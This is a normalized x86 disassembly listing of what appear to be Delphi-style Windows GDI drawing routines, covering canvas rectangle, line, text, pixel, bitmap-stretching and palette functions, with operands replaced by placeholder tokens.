mov edx [ ebp - 0x4 ]
mov eax edi
call sub_412640
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d2b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
push esi
mov eax [ ebx + 0x4 ]
push eax
call DrawFocusRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d2ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
mov eax [ ebx + 0x14 ]
call sub_41cf48
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d328
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
mov eax [ ebx + 0x14 ]
call sub_41cf48
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41d364
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41d3c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41d3f0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41d428
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41d470
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d4ac
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_41d780
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_41d4d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
mov edi [ ebx + 0x54 ]
or edi 0x4
mov eax [ ebx + 0x14 ]
call sub_41d028
cmp al 0x1
je r-xdata
test [ ebx + 0x54 ] 0x80
je r-xdata
or edi 0x2
push 0x0
mov eax esi
call sub_4042a0
push eax
mov eax esi
call sub_4044a0
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_41d4ac
cmp al 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_41d5bc
inc eax
add [ ebp - 0x4 ] eax
sub_41d578
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4042a0
push eax
mov eax edi
call sub_4044a0
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41d5bc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d578
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d5d8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41d578
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41d5f8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41d644
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d64b
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41d39c
sub_41d6a4
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41d6c8
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41d3c4
pop ecx
pop edx
pop edi
pop esi
retn
sub_41d6e8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41d714
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
mov eax [ ebp + 0x8 ]
call sub_41c268
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41d75c
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41d854
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetClipBox
pop esi
pop ebx
retn
sub_41d7a0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41d800
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41d7a0
mov edx esp
mov eax ebx
call sub_41d6a4
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41d6c8
sub_41d854
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41d8f0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
test bl 0x8
je r-xdata
mov eax esi
call sub_41d91c
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41d94c
sub_41d8f0
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41c73c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c268
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41d91c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41cc3c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41d94c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41cf48
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41cf48
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41d028
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41cf0c
call sub_41c268
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41cf0c
call sub_41c268
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41da7c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41dac6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dacd
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_41dad0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41db6c
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41da7c
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404250
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db73
lea eax [ ebp - 0x104 ]
call sub_403fe0
retn
sub_41db88
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41dcd6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41dc45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41dad0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41dad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dcdd
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41dce8
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41dd1c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41db78
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41df9c
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41db78
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dfa3
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41db78
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41ddef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_4069f0
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dfa3
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41dfb0
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41dfe8
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402cac
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41e060
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41e0b8
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028b8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e1b5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e1bc
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41e1d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41e256
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41e268
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028b8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41e060
mov eax esp
call sub_41e1d0
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41e30c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41e060
mov [ esp ] eax
sub_41e360
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41dd08
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41dce8
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41e50c
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41db78
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e432
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41db88
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e439
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41da7c
sub_41e439
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41dd08
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41db78
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e4ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
